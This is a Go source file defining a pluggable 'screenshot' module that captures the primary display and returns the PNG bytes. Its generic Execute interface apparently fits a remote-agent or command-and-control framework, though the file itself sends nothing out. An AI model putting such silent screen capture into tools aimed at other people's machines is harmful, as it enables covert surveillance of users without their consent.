package modules

import (
	"bytes"
    "fmt"
    "image/png"

    "github.com/kbinani/screenshot"
)

type ScreenshotModule struct{}

func NewScreenshotModule() *ScreenshotModule {
    return &ScreenshotModule{}
}

func (m *ScreenshotModule) Name() string {
    return "screenshot"
}

func (m *ScreenshotModule) Execute(filename string, data []byte) (string, error) {
    numDisplays := screenshot.NumActiveDisplays()
    if numDisplays == 0 {
        return "", fmt.Errorf("no active displays found")
    }

    bounds := screenshot.GetDisplayBounds(0)
    img, err := screenshot.CaptureRect(bounds)
    if err != nil {
        return "", fmt.Errorf("failed to capture screenshot: %w", err)
    }

	var buf bytes.Buffer
    if err := png.Encode(&buf, img); err != nil {
        return "", fmt.Errorf("failed to encode png: %w", err)
    }

    // Convert the buffer to a string
    imgStr := buf.String()

    return imgStr, nil
}
